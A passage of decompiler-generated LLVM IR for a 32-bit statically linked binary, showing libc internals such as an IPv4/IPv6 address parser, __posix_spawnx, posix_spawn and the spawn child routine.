  %stack_var_-104 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050494 = load i32, i32* @ebp, align 4
  %v0_8050495 = load i32, i32* @edi, align 4
  %v0_8050496 = load i32, i32* @esi, align 4
  %v0_8050497 = load i32, i32* @ebx, align 4
  store i32 %v0_8050497, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v2_80504a2 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80504a2, i32* @esi, align 4
  store i32 %tmp13, i32* @ebp, align 4
  %v2_80504af = inttoptr i32 %arg2 to i8*
  %v3_80504af = call i32 @__inet_aton(i8* %v2_80504af, i32 %v2_80504a2)
  %tmp29 = icmp slt i32 %v3_80504af, 1
  br i1 %tmp29, label %dec_label_pc_80504f1, label %dec_label_pc_80504bb

dec_label_pc_80504bb:                             ; preds = %entry
  %v12_80504bb = icmp eq i32 %arg3, 10
  br i1 %v12_80504bb, label %dec_label_pc_80505ea, label %dec_label_pc_80504c9

dec_label_pc_80504c9:                             ; preds = %dec_label_pc_80504bb
  %v0_80504cd = load i32, i32* @ebp, align 4
  %v1_80504cd = add i32 %v0_80504cd, 8
  %v3_80504d1 = inttoptr i32 %v1_80504cd to i8*
  %v4_80504d1 = call i32 @memcpy(i8* %v3_80504d1, i32 %v2_80504a2, i32 4)
  store i32 1, i32* @edx, align 4
  %v0_80504de = load i32, i32* @ebp, align 4
  %v1_80504de = inttoptr i32 %v0_80504de to i32*
  store i32 2, i32* %v1_80504de, align 4
  %v0_80504e5 = load i32, i32* @ebp, align 4
  %v1_80504e5 = add i32 %v0_80504e5, 4
  %v2_80504e5 = inttoptr i32 %v1_80504e5 to i32*
  store i32 0, i32* %v2_80504e5, align 4
  %v0_80505f2.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80505ef

dec_label_pc_80504f1:                             ; preds = %entry
  %v0_80504f5 = load i32, i32* @ebx, align 4
  %v3_80504f6 = call i32 @strchr(i32 %v0_80504f5, i8 37)
  %v1_80504fe = icmp eq i32 %v3_80504f6, 0
  %v1_8050500 = inttoptr i32 %v3_80504f6 to i8*
  store i32 %v3_80504f6, i32* @edi, align 4
  br i1 %v1_80504fe, label %dec_label_pc_8050522, label %dec_label_pc_8050504

dec_label_pc_8050504:                             ; preds = %dec_label_pc_80504f1
  %v1_8050506 = load i32, i32* @ebx, align 4
  %v2_8050506 = sub i32 %v3_80504f6, %v1_8050506
  store i32 %v2_8050506, i32* @esi, align 4
  %v1_8050508 = add i32 %v2_8050506, -63
  %v6_8050508 = sub i32 62, %v2_8050506
  %v7_8050508 = and i32 %v6_8050508, %v2_8050506
  %v8_8050508 = icmp slt i32 %v7_8050508, 0
  %v9_8050508 = icmp eq i32 %v1_8050508, 0
  %v10_8050508 = icmp slt i32 %v1_8050508, 0
  %v3_805050b = icmp eq i1 %v10_8050508, %v8_8050508
  %v4_805050b = icmp eq i1 %v9_8050508, false
  %v5_805050b = and i1 %v4_805050b, %v3_805050b
  br i1 %v5_805050b, label %dec_label_pc_8050522, label %dec_label_pc_805050d

dec_label_pc_805050d:                             ; preds = %dec_label_pc_8050504
  %v2_8050510 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_8050510, i32* @ebx, align 4
  %v3_8050515 = bitcast i32* %stack_var_-104 to i8*
  %v4_8050515 = call i32 @memcpy(i8* %v3_8050515, i32 %v1_8050506, i32 %v2_8050506)
  %v0_805051a = load i32, i32* @esp, align 4
  %v1_805051a = load i32, i32* @esi, align 4
  %v2_805051a = add i32 %v0_805051a, 36
  %v3_805051a = add i32 %v2_805051a, %v1_805051a
  %v4_805051a = inttoptr i32 %v3_805051a to i8*
  store i8 0, i8* %v4_805051a, align 1
  br label %dec_label_pc_8050522

dec_label_pc_8050522:                             ; preds = %dec_label_pc_8050504, %dec_label_pc_80504f1, %dec_label_pc_805050d
  %v0_8050522 = load i32, i32* @ecx, align 4
  %v2_8050523 = ptrtoint i8* %stack_var_-40 to i32
  store i32 %v2_8050523, i32* @esi, align 4
  %v0_8050528 = load i32, i32* @ebx, align 4
  %v4_805052b = inttoptr i32 %v0_8050528 to i8*
  %v5_805052b = call i32 @inet_pton(i32 10, i8* %v4_805052b, i32 %v2_8050523, i32 %v0_8050522)
  store i32 0, i32* @edx, align 4
  %tmp30 = icmp slt i32 %v5_805052b, 1
  br i1 %tmp30, label %dec_label_pc_80505ef, label %dec_label_pc_805053d

dec_label_pc_805053d:                             ; preds = %dec_label_pc_8050522
  %v12_805053d = icmp eq i32 %arg3, 2
  br i1 %v12_805053d, label %dec_label_pc_80505ea, label %dec_label_pc_805054b

dec_label_pc_805054b:                             ; preds = %dec_label_pc_805053d
  %v0_805054f = load i32, i32* @ebp, align 4
  %v1_805054f = add i32 %v0_805054f, 8
  %v3_8050553 = inttoptr i32 %v1_805054f to i8*
  %v4_8050553 = call i32 @memcpy(i8* %v3_8050553, i32 %v2_8050523, i32 16)
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_805055f = load i32, i32* @ebp, align 4
  %v1_805055f = inttoptr i32 %v0_805055f to i32*
  store i32 10, i32* %v1_805055f, align 4
  br i1 %v1_80504fe, label %dec_label_pc_805054b.dec_label_pc_80505e0_crit_edge, label %dec_label_pc_8050568

dec_label_pc_805054b.dec_label_pc_80505e0_crit_edge: ; preds = %dec_label_pc_805054b
  %v0_80505e0.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80505e0

dec_label_pc_8050568:                             ; preds = %dec_label_pc_805054b
  %v2_8050568 = add i32 %v3_80504f6, 1
  %v3_8050568 = inttoptr i32 %v2_8050568 to i8*
  %v4_8050568 = load i8, i8* %v3_8050568, align 1
  %v5_8050568 = sext i8 %v4_8050568 to i32
  store i32 %v2_8050568, i32* @ebx, align 4
  %v1_805056f = add nsw i32 %v5_8050568, -48
  %v6_8050575 = icmp ugt i32 %v1_805056f, 9
  br i1 %v6_8050575, label %dec_label_pc_805058e, label %dec_label_pc_8050577

dec_label_pc_8050577:                             ; preds = %dec_label_pc_8050568
  %v2_805057a = ptrtoint i8** %stack_var_-24 to i32
  %v4_8050580 = call i32 @strtoull(i32 %v2_8050568, i32 %v2_805057a, i32 10, i32 %v1_805056f)
  %v0_8050588 = load i32, i32* @edx, align 4
  store i32 %v0_8050588, i32* @ecx, align 4
  store i32 %v4_8050580, i32* %edx.global-to-local, align 4
  %v3_8050596.pre = load i8*, i8** %stack_var_-24, align 4
  br label %dec_label_pc_8050596

dec_label_pc_805058e:                             ; preds = %dec_label_pc_8050568
  %tmp31 = bitcast i8** %stack_var_-24 to i32*
  store i32 %v3_80504f6, i32* %tmp31, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  br label %dec_label_pc_8050596

dec_label_pc_8050596:                             ; preds = %dec_label_pc_8050577, %dec_label_pc_805058e
  %v0_80505e08 = phi i32 [ %v4_8050580, %dec_label_pc_8050577 ], [ 0, %dec_label_pc_805058e ]
  %v0_80505db = phi i32 [ %v0_8050588, %dec_label_pc_8050577 ], [ 0, %dec_label_pc_805058e ]
  %v3_8050596 = phi i8* [ %v3_8050596.pre, %dec_label_pc_8050577 ], [ %v1_8050500, %dec_label_pc_805058e ]
  %v2_805059a = load i8, i8* %v3_8050596, align 1
  %v3_805059a = icmp eq i8 %v2_805059a, 0
  br i1 %v3_805059a, label %dec_label_pc_80505db, label %dec_label_pc_805059f

dec_label_pc_805059f:                             ; preds = %dec_label_pc_8050596
  %v3_805059f = load i8, i8* %stack_var_-40, align 1
  %v11_80505a3 = icmp eq i8 %v3_805059f, -2
  %v1_80505a5 = icmp eq i1 %v11_80505a3, false
  br i1 %v1_80505a5, label %dec_label_pc_80505b6, label %dec_label_pc_80505a7

dec_label_pc_80505a7:                             ; preds = %dec_label_pc_805059f
  %v1_80505ac = and i8 %tmp10, -64
  %v7_80505b1 = icmp eq i8 %v1_80505ac, -128
  br label %dec_label_pc_80505c5

dec_label_pc_80505b6:                             ; preds = %dec_label_pc_805059f
  %v9_80505b6 = icmp eq i8 %v3_805059f, -1
  %v1_80505b8 = icmp eq i1 %v9_80505b6, false
  br i1 %v1_80505b8, label %dec_label_pc_80505ea, label %dec_label_pc_80505ba

dec_label_pc_80505ba:                             ; preds = %dec_label_pc_80505b6
  %tmp = urem i8 %tmp10, 16
  %v9_80505c2 = icmp eq i8 %tmp, 2
  br label %dec_label_pc_80505c5

dec_label_pc_80505c5:                             ; preds = %dec_label_pc_80505a7, %dec_label_pc_80505ba
  %v0_80505c5 = phi i1 [ %v7_80505b1, %dec_label_pc_80505a7 ], [ %v9_80505c2, %dec_label_pc_80505ba ]
  %v1_80505c5 = icmp eq i1 %v0_80505c5, false
  br i1 %v1_80505c5, label %dec_label_pc_80505ea, label %dec_label_pc_80505c7

dec_label_pc_80505c7:                             ; preds = %dec_label_pc_80505c5
  %v0_80505ca = load i32, i32* @ebx, align 4
  %v1_80505cb = call i32 @if_nametoindex(i32 %v0_80505ca)
  %v1_80505d3 = icmp eq i32 %v1_80505cb, 0
  store i32 %v1_80505cb, i32* %edx.global-to-local, align 4
  %v1_80505d7 = icmp eq i1 %v1_80505d3, false
  br i1 %v1_80505d7, label %dec_label_pc_80505e0, label %dec_label_pc_80505ea

dec_label_pc_80505db:                             ; preds = %dec_label_pc_8050596
  %v1_80505db = icmp eq i32 %v0_80505db, 0
  br i1 %v1_80505db, label %dec_label_pc_80505e0, label %dec_label_pc_80505ea

dec_label_pc_80505e0:                             ; preds = %dec_label_pc_805054b.dec_label_pc_80505e0_crit_edge, %dec_label_pc_80505db, %dec_label_pc_80505c7
  %v0_80505e0 = phi i32 [ %v0_80505e0.pre, %dec_label_pc_805054b.dec_label_pc_80505e0_crit_edge ], [ %v0_80505e08, %dec_label_pc_80505db ], [ %v1_80505cb, %dec_label_pc_80505c7 ]
  %v1_80505e0 = load i32, i32* @ebp, align 4
  %v2_80505e0 = add i32 %v1_80505e0, 4
  %v3_80505e0 = inttoptr i32 %v2_80505e0 to i32*
  store i32 %v0_80505e0, i32* %v3_80505e0, align 4
  store i32 1, i32* @edx, align 4
  br label %dec_label_pc_80505ef

dec_label_pc_80505ea:                             ; preds = %dec_label_pc_80505c7, %dec_label_pc_80505db, %dec_label_pc_80505c5, %dec_label_pc_80505b6, %dec_label_pc_805053d, %dec_label_pc_80504bb
  store i32 -2, i32* @edx, align 4
  br label %dec_label_pc_80505ef

dec_label_pc_80505ef:                             ; preds = %dec_label_pc_8050522, %dec_label_pc_80505e0, %dec_label_pc_80504c9, %dec_label_pc_80505ea
  %v0_80505f2 = phi i32 [ 0, %dec_label_pc_8050522 ], [ 1, %dec_label_pc_80505e0 ], [ %v0_80505f2.pre, %dec_label_pc_80504c9 ], [ -2, %dec_label_pc_80505ea ]
  %v2_80505f4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80505f4, i32* @ebx, align 4
  store i32 %v0_8050496, i32* @esi, align 4
  store i32 %v0_8050495, i32* @edi, align 4
  store i32 %v0_8050494, i32* @ebp, align 4
  ret i32 %v0_80505f2

; uselistorder directives
  uselistorder i32 %v1_8050508, { 1, 0 }
  uselistorder i32 %v2_8050506, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v3_80504f6, { 0, 1, 2, 4, 5, 3 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i8** %stack_var_-24, { 1, 0, 2 }
  uselistorder i8 %tmp10, { 1, 0 }
  uselistorder i8 16, { 1, 7, 8, 2, 3, 0, 9, 4, 10, 5, 6, 11 }
  uselistorder label %dec_label_pc_80505ef, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80505ea, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80505e0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80505c5, { 1, 0 }
  uselistorder label %dec_label_pc_8050596, { 1, 0 }
  uselistorder label %dec_label_pc_8050522, { 2, 0, 1 }
}

define i32 @__posix_spawnx(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp17 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-540 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-1580 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80505fc = load i32, i32* @edi, align 4
  %v0_80505fe = load i32, i32* @ebx, align 4
  store i32 %v0_80505fe, i32* %stack_var_-12, align 4
  store i32 %tmp17, i32* @edi, align 4
  store i32 %arg5, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_8050623 = ptrtoint i32* %stack_var_-204 to i32
  store i32 %v2_8050623, i32* @esi, align 4
  store i32 %v2_8050623, i32* %stack_var_-1580, align 4
  %v3_805062b = call i32 @pipe2(i32* nonnull %stack_var_-204, i32 524288)
  %v1_8050633 = icmp eq i32 %v3_805062b, 0
  br i1 %v1_8050633, label %dec_label_pc_8050643, label %dec_label_pc_8050637

dec_label_pc_8050637:                             ; preds = %entry
  %v0_8050637 = load i32, i32* %stack_var_-1580, align 4
  %v1_8050637 = call i32 @__errno_location(i32 %v0_8050637)
  %v1_805063c = inttoptr i32 %v1_8050637 to i32*
  br label %dec_label_pc_80507be

dec_label_pc_8050643:                             ; preds = %entry
  store i32 1, i32* %stack_var_-1580, align 4
  %v3_805064f = call i32 @__pthread_setcancelstate(i32 1, i32* nonnull %stack_var_-20)
  %v0_8050657 = load i32, i32* @ebx, align 4
  %v1_8050657 = icmp eq i32 %v0_8050657, 0
  %v1_8050659 = icmp eq i1 %v1_8050657, false
  %.pre = ptrtoint i32* %stack_var_-540 to i32
  br i1 %v1_8050659, label %dec_label_pc_8050673, label %dec_label_pc_805065b

dec_label_pc_805065b:                             ; preds = %dec_label_pc_8050643
  store i32 %.pre, i32* %stack_var_-1580, align 4
  %v3_805066b = bitcast i32* %stack_var_-540 to i8*
  %v4_805066b = call i32 @memset(i8* %v3_805066b, i32 0, i32 336)
  br label %dec_label_pc_8050673

dec_label_pc_8050673:                             ; preds = %dec_label_pc_8050643, %dec_label_pc_805065b
  %v2_8050681 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8050681, i32* @ebx, align 4
  store i32 %v2_8050681, i32* %stack_var_-1580, align 4
  %v3_80506a6 = bitcast i32* %stack_var_-44 to i8*
  %v4_80506a6 = call i32 @memcpy(i8* %v3_80506a6, i32 ptrtoint (i32* @global_var_8054708.388 to i32), i32 16)
  %v2_80506d8 = ptrtoint i32* %stack_var_-196 to i32
  store i32 0, i32* %stack_var_-1580, align 4
  %v4_80506e3 = call i32 @pthread_sigmask(i32 0, i32 %v2_8050681, i32* nonnull %stack_var_-196)
  %v4_80506fb = call i32 @__clone(i32 134547441, i32 %.pre, i32 16657, i32 %v2_8050623)
  store i32 %tmp, i32* %stack_var_-1580, align 4
  store i32 %v4_80506fb, i32* @ebx, align 4
  %v1_805070c = call i32 @close(i32 %tmp)
  %tmp38 = icmp slt i32 %v4_80506fb, 1
  br i1 %tmp38, label %dec_label_pc_8050765, label %dec_label_pc_8050718

dec_label_pc_8050718:                             ; preds = %dec_label_pc_8050673
  %v2_805071b = ptrtoint i32* %stack_var_-16 to i32
  %v3_8050723 = load i32, i32* %stack_var_-204, align 4
  store i32 %v3_8050723, i32* %stack_var_-1580, align 4
  %v4_805072a = call i32 @read(i32 %v3_8050723, i32 %v2_805071b, i32 4, i32 %v1_805070c)
  %v9_8050732 = icmp eq i32 %v4_805072a, 4
  br i1 %v9_8050732, label %dec_label_pc_8050744, label %dec_label_pc_8050737

dec_label_pc_8050737:                             ; preds = %dec_label_pc_8050718
  store i32 0, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8050770

dec_label_pc_8050744:                             ; preds = %dec_label_pc_8050718
  store i32 0, i32* %stack_var_-24, align 4
  %v2_8050752 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v4_80506fb, i32* %stack_var_-1580, align 4
  %v4_805075b = call i32 @waitpid(i32 %v4_80506fb, i32 %v2_8050752, i32 0, i32 %v2_8050623)
  br label %dec_label_pc_8050770

dec_label_pc_8050765:                             ; preds = %dec_label_pc_8050673
  %v1_8050767 = sub i32 0, %v4_80506fb
  store i32 %v1_8050767, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8050770

dec_label_pc_8050770:                             ; preds = %dec_label_pc_8050744, %dec_label_pc_8050737, %dec_label_pc_8050765
  %v3_8050773 = load i32, i32* %stack_var_-204, align 4
  store i32 %v3_8050773, i32* %stack_var_-1580, align 4
  %v1_805077a = call i32 @close(i32 %v3_8050773)
  %v3_8050782 = load i32, i32* %stack_var_-16, align 4
  %v4_8050782 = icmp eq i32 %v3_8050782, 0
  %v1_805078a = icmp eq i1 %v4_8050782, false
  br i1 %v1_805078a, label %dec_label_pc_8050792, label %dec_label_pc_805078c

dec_label_pc_805078c:                             ; preds = %dec_label_pc_8050770
  %v1_805078c = icmp eq i32* %arg1, null
  br i1 %v1_805078c, label %dec_label_pc_8050792, label %dec_label_pc_8050790

dec_label_pc_8050790:                             ; preds = %dec_label_pc_805078c
  store i32 %v4_80506fb, i32* %arg1, align 4
  br label %dec_label_pc_8050792

dec_label_pc_8050792:                             ; preds = %dec_label_pc_805078c, %dec_label_pc_8050770, %dec_label_pc_8050790
  store i32 2, i32* %stack_var_-1580, align 4
  %v4_805079f = call i32 @pthread_sigmask(i32 2, i32 %v2_80506d8, i32* null)
  store i32 %v2_80506d8, i32* @edx, align 4
  %v3_80507a8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_80507a8, i32* %stack_var_-1580, align 4
  %v3_80507af = call i32 @__pthread_setcancelstate(i32 %v3_80507a8, i32* null)
  br label %dec_label_pc_80507be

dec_label_pc_80507be:                             ; preds = %dec_label_pc_8050637, %dec_label_pc_8050792
  %v0_80507c7.in = phi i32* [ %v1_805063c, %dec_label_pc_8050637 ], [ %stack_var_-16, %dec_label_pc_8050792 ]
  %v0_80507c7 = load i32, i32* %v0_80507c7.in, align 4
  %v2_80507c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80507c4, i32* @ebx, align 4
  store i32 %v0_80505fc, i32* @edi, align 4
  ret i32 %v0_80507c7

; uselistorder directives
  uselistorder i32 %v4_80506fb, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32* %stack_var_-204, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-1580, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-540, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @waitpid, { 1, 0, 2 }
  uselistorder i32 (i32, i32*)* @__pthread_setcancelstate, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80507be, { 1, 0 }
  uselistorder label %dec_label_pc_8050792, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050770, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050673, { 1, 0 }
}

define i32 @posix_spawn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v7_80507e8 = inttoptr i32 %arg1 to i32*
  %v8_80507e8 = call i32 @__posix_spawnx(i32* %v7_80507e8, i32 %arg2, i32 134552304, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6)
  ret i32 %v8_80507e8
}

define i32 @child(i32* %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp23 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  store i32 1, i32* @edi, align 4
  %v2_8050807 = ptrtoint i32* %stack_var_-288 to i32
  store i32 %v2_8050807, i32* %stack_var_-316, align 4
  %v3_805080c = bitcast i32* %stack_var_-288 to i8*
  %v4_805080c = call i32 @memset(i8* %v3_805080c, i32 0, i32 140)
  %v1_8050818 = add i32 %tmp23, 144
  %v2_8050818 = inttoptr i32 %v1_8050818 to i32*
  %v3_8050818 = load i32, i32* %v2_8050818, align 4
  %v1_805081e = add i32 %tmp23, 4
  %v2_805081e = inttoptr i32 %v1_805081e to i32*
  %v3_805081e = load i32, i32* %v2_805081e, align 4
  store i32 %v3_805081e, i32* @ebp, align 4
  %v1_8050821 = add i32 %tmp23, 148
  %v2_8050821 = inttoptr i32 %v1_8050821 to i32*
  %v3_8050821 = load i32, i32* %v2_8050821, align 4
  store i32 %v3_8050821, i32* @esi, align 4
  %v2_805082c = load i32, i32* %arg1, align 4
  store i32 %v2_805082c, i32* %stack_var_-316, align 4
  %v1_805082e = call i32 @close(i32 %v2_805082c)
  %v2_8050834 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_8050834, i32* @ebx, align 4
  store i32 %v2_8050834, i32* %stack_var_-316, align 4
  %v1_805083c = call i32 @__get_handler_set(i32 %v2_8050834)
  br label %dec_label_pc_8050844

dec_label_pc_8050844:                             ; preds = %dec_label_pc_80508af, %entry
  %v0_8050849 = phi i32 [ %v0_805084912, %dec_label_pc_80508af ], [ %v1_805083c, %entry ]
  %v0_8050844 = load i32, i32* @esi, align 4
  %v1_8050844 = inttoptr i32 %v0_8050844 to i8*
  %v2_8050844 = load i8, i8* %v1_8050844, align 1
  %v3_8050844 = and i8 %v2_8050844, 4
  %v4_8050844 = icmp eq i8 %v3_8050844, 0
  br i1 %v4_8050844, label %dec_label_pc_805085c, label %dec_label_pc_8050849

dec_label_pc_8050849:                             ; preds = %dec_label_pc_8050844
  %v0_805084b = load i32, i32* @edi, align 4
  %v1_805084c = add i32 %v0_8050844, 8
  store i32 %v1_805084c, i32* %stack_var_-316, align 4
  %v4_8050850 = call i32 @sigismember(i32 %v1_805084c, i32 %v0_805084b, i32 %v0_8050849, i32 %v0_8050849)
  %v1_8050858 = icmp eq i32 %v4_8050850, 0
  %v1_805085a = icmp eq i1 %v1_8050858, false
  br i1 %v1_805085a, label %dec_label_pc_805089e, label %dec_label_pc_805085c

dec_label_pc_805085c:                             ; preds = %dec_label_pc_8050849, %dec_label_pc_8050844
  %v0_805085c = phi i32 [ %v4_8050850, %dec_label_pc_8050849 ], [ %v0_8050849, %dec_label_pc_8050844 ]
  %v0_805085e = load i32, i32* @edi, align 4
  store i32 %v2_8050834, i32* %stack_var_-316, align 4
  %v4_8050860 = call i32 @sigismember(i32 %v2_8050834, i32 %v0_805085e, i32 %v0_805085c, i32 %v0_805085c)
  %v1_8050868 = icmp eq i32 %v4_8050860, 0
  br i1 %v1_8050868, label %dec_label_pc_80508af, label %dec_label_pc_805086c

dec_label_pc_805086c:                             ; preds = %dec_label_pc_805085c
  %v0_805086c = load i32, i32* @edi, align 4
  %v1_805086c = add i32 %v0_805086c, -32
  %v6_8050872 = icmp ugt i32 %v1_805086c, 2
  br i1 %v6_8050872, label %dec_label_pc_805087e, label %dec_label_pc_805089e

dec_label_pc_805087e:                             ; preds = %dec_label_pc_805086c
  store i32 %v0_805086c, i32* %stack_var_-316, align 4
  %v4_8050887 = call i32 @__libc_sigaction(i32 %v0_805086c)
  %v3_805088f = load i32, i32* %stack_var_-288, align 4
  %v12_805088f = icmp eq i32 %v3_805088f, 1
  br i1 %v12_805088f, label %dec_label_pc_80508af, label %dec_label_pc_805089e

dec_label_pc_805089e:                             ; preds = %dec_label_pc_8050849, %dec_label_pc_805087e, %dec_label_pc_805086c
  %storemerge1 = phi i32 [ 1, %dec_label_pc_805086c ], [ 0, %dec_label_pc_805087e ], [ 0, %dec_label_pc_8050849 ]
  store i32 %storemerge1, i32* %stack_var_-288, align 4
  %v0_80508a6 = load i32, i32* @edi, align 4
  store i32 %v0_80508a6, i32* %stack_var_-316, align 4
  %v4_80508a7 = call i32 @__libc_sigaction(i32 %v0_80508a6)
  br label %dec_label_pc_80508af

dec_label_pc_80508af:                             ; preds = %dec_label_pc_805087e, %dec_label_pc_805085c, %dec_label_pc_805089e
  %v0_805084912 = phi i32 [ %v4_8050887, %dec_label_pc_805087e ], [ 0, %dec_label_pc_805085c ], [ %v4_80508a7, %dec_label_pc_805089e ]
  %v0_80508af = load i32, i32* @edi, align 4
  %v1_80508af = add i32 %v0_80508af, 1
  store i32 %v1_80508af, i32* @edi, align 4
  %v9_80508b0 = icmp eq i32 %v0_80508af, 64
  %v1_80508b3 = icmp eq i1 %v9_80508b0, false
  br i1 %v1_80508b3, label %dec_label_pc_8050844, label %dec_label_pc_80508b5

dec_label_pc_80508b5:                             ; preds = %dec_label_pc_80508af
  %v0_80508b5 = load i32, i32* @esi, align 4
  %v1_80508b5 = inttoptr i32 %v0_80508b5 to i8*
  %v2_80508b5 = load i8, i8* %v1_80508b5, align 1
  %v3_80508b5 = and i8 %v2_80508b5, 2
  %v4_80508b5 = icmp eq i8 %v3_80508b5, 0
  br i1 %v4_80508b5, label %dec_label_pc_80508d8, label %dec_label_pc_80508ba

dec_label_pc_80508ba:                             ; preds = %dec_label_pc_80508b5
  store i32 57, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v1_80508c1 = add i32 %v0_80508b5, 4
  %v2_80508c1 = inttoptr i32 %v1_80508c1 to i32*
  %v3_80508c1 = load i32, i32* %v2_80508c1, align 4
  store i32 %v3_80508c1, i32* %ecx.global-to-local, align 4
  %v0_80508c4 = load i32, i32* %stack_var_-316, align 4
  %v1_80508c4 = call i32 @__vsyscall(i32 %v0_80508c4)
  %v1_80508c9 = icmp eq i32 %v1_80508c4, 0
  store i32 %v1_80508c4, i32* %stack_var_-20, align 4
  %v1_80508d2 = icmp eq i1 %v1_80508c9, false
  br i1 %v1_80508d2, label %dec_label_pc_8050a9a, label %dec_label_pc_80508ba.dec_label_pc_80508d8_crit_edge

dec_label_pc_80508ba.dec_label_pc_80508d8_crit_edge: ; preds = %dec_label_pc_80508ba
  %v0_80508d8.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80508d8

dec_label_pc_80508d8:                             ; preds = %dec_label_pc_80508ba.dec_label_pc_80508d8_crit_edge, %dec_label_pc_80508b5
  %v0_80508d8 = phi i32 [ %v0_80508d8.pre, %dec_label_pc_80508ba.dec_label_pc_80508d8_crit_edge ], [ %v0_80508b5, %dec_label_pc_80508b5 ]
  %v1_80508d8 = inttoptr i32 %v0_80508d8 to i8*
  %v2_80508d8 = load i8, i8* %v1_80508d8, align 1
  %v3_80508d8 = urem i8 %v2_80508d8, 2
  %v4_80508d8 = icmp eq i8 %v3_80508d8, 0
  br i1 %v4_80508d8, label %dec_label_pc_805093a, label %dec_label_pc_80508dd

dec_label_pc_80508dd:                             ; preds = %dec_label_pc_80508d8
  store i32 200, i32* @edx, align 4
  store i32 200, i32* @eax, align 4
  %v0_80508e4 = load i32, i32* %stack_var_-20, align 4
  %v1_80508e4 = call i32 @__vsyscall(i32 %v0_80508e4)
  store i32 214, i32* %ecx.global-to-local, align 4
  store i32 214, i32* @eax, align 4
  store i32 %v1_80508e4, i32* @edx, align 4
  %v1_80508f8 = call i32 @__vsyscall(i32 %v1_80508e4)
  %v1_80508fd = icmp eq i32 %v1_80508f8, 0
  store i32 %v1_80508f8, i32* %ecx.global-to-local, align 4
  store i32 %v1_80508f8, i32* %stack_var_-20, align 4
  %v1_8050908 = icmp eq i1 %v1_80508fd, false
  br i1 %v1_8050908, label %dec_label_pc_8050a9a, label %dec_label_pc_805090e

dec_label_pc_805090e:                             ; preds = %dec_label_pc_80508dd
  store i32 199, i32* @edx, align 4
  store i32 199, i32* @eax, align 4
  %v1_8050915 = call i32 @__vsyscall(i32 %v1_80508f8)
  %v0_805091a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805091a = and i32 %v0_805091a, -256
  %v2_805091a = or i32 %v1_805091a, 213
  store i32 %v2_805091a, i32* %ecx.global-to-local, align 4
  store i32 %v2_805091a, i32* @eax, align 4
  store i32 %v1_8050915, i32* @edx, align 4
  %v1_8050926 = call i32 @__vsyscall(i32 %v1_8050915)
  %v1_805092b = icmp eq i32 %v1_8050926, 0
  store i32 %v1_8050926, i32* %stack_var_-20, align 4
  %v1_8050934 = icmp eq i1 %v1_805092b, false
  br i1 %v1_8050934, label %dec_label_pc_8050a9a, label %dec_label_pc_805093a

dec_label_pc_805093a:                             ; preds = %dec_label_pc_805090e, %dec_label_pc_80508d8
  %v4_805093a = icmp eq i32 %v3_8050818, 0
  br i1 %v4_805093a, label %dec_label_pc_8050a28, label %dec_label_pc_8050945

dec_label_pc_8050945:                             ; preds = %dec_label_pc_805093a
  %v1_8050949 = add i32 %v3_8050818, 8
  %v2_8050949 = inttoptr i32 %v1_8050949 to i32*
  %v3_8050949 = load i32, i32* %v2_8050949, align 4
  %v1_805094c = icmp eq i32 %v3_8050949, 0
  br i1 %v1_805094c, label %dec_label_pc_8050a28, label %dec_label_pc_8050954

dec_label_pc_8050954:                             ; preds = %dec_label_pc_8050945, %dec_label_pc_8050954
